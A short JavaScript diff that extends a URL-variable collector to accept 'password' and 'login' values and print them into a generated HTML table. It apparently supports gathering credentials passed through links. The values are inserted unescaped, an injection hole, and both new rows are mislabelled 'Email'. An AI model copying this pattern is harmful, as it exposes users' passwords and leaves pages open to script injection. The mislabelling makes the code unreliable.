@@ -6,7 +6,7 @@ const FILE = path.join(process.cwd(), "data", "urls.json");
 // ======================
 // ALLOWED VARIABLES
 // ======================
-const allowed = ["user", "email", "phone", "ip"];
+const allowed = ["user", "email", "phone", "password", "login", "ip"];
 
 // ======================
 // LOAD URLS
@@ -86,6 +86,8 @@ function buildHtml(vars) {
 
 <tr><td>User</td><td>${vars.user || "-"}</td></tr>
 <tr><td>Email</td><td>${vars.email || "-"}</td></tr>
+<tr><td>Email</td><td>${vars.password || "-"}</td></tr>
+<tr><td>Email</td><td>${vars.login || "-"}</td></tr>
 <tr><td>Phone</td><td>${vars.phone || "-"}</td></tr>
 <tr><td>IP</td><td>${vars.ip || "-"}</td></tr>
 
